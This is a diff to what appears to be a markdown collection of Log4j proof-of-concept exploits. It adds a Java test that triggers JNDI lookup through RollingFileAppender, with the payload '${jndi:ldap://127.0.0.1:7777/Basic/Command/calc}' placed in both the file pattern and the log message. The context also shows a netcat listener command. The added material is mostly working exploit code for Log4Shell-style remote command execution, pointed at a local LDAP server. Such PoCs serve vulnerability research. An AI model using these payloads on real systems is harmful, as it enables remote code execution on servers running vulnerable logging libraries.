@@ -75,6 +75,35 @@ nc -l -p 7777
     }
 ```
 
+**RollingFileAppender.append()**
+```
+    @Test
+    public void appendRollingFileAppenderTest(){
+        PatternLayout layout = PatternLayout.newBuilder()
+                .withConfiguration(new DefaultConfiguration())
+                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
+                .build();
+
+        RollingFileAppender appender = RollingFileAppender.newBuilder().setConfiguration(new DefaultConfiguration())
+                .withFileName("app.log")
+                .withFilePattern("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
+                .setLayout(layout)
+                .withAppend(true)
+                .setName("RollingFile")
+                .withPolicy(SizeBasedTriggeringPolicy.createPolicy("1B"))
+                .withStrategy(DefaultRolloverStrategy.newBuilder()
+                        .withMax(String.valueOf(3))
+                        .withConfig(new DefaultConfiguration())
+                        .withFileIndex("min")
+                        .build())
+                .build();
+
+        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
+        appender.getManager().writeBytes("asdasdasd1".getBytes(), 0 ,10);
+        appender.append(logEvent);
+    }
+```
+
 ## Pocs for Context Tree ##
 
 **LogManager.getContext()**
